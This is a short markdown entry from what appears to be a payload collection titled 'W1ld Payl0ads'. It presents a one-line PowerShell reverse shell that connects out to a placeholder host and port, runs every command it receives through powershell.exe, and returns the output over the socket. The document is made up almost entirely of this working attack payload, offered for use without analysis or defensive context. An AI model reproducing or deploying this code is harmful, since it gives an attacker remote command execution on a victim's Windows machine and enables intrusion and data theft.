
## W `1` l d P a y l `0` a d s

# [A] Powershell - Reverse Shell
[1] `noname`

```
$c=New-Object System.Net.Sockets.TCPClient('0.0.0.0',2222);$s=$c.GetStream();$r=New-Object System.IO.StreamReader($s);$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$sh=New-Object -ComObject 'WScript.Shell';$P=$sh.Exec('powershell.exe');$P|Out-Null;$w.WriteLine('Connected');while($true){$d=$r.ReadLine();switch($d){'exit'{$c.Close();return}default{$o=$sh.Exec("powershell.exe -Command $d");$res=$o.StdOut.ReadAll()+$o.StdErr.ReadAll();$w.WriteLine($res)}}}
```
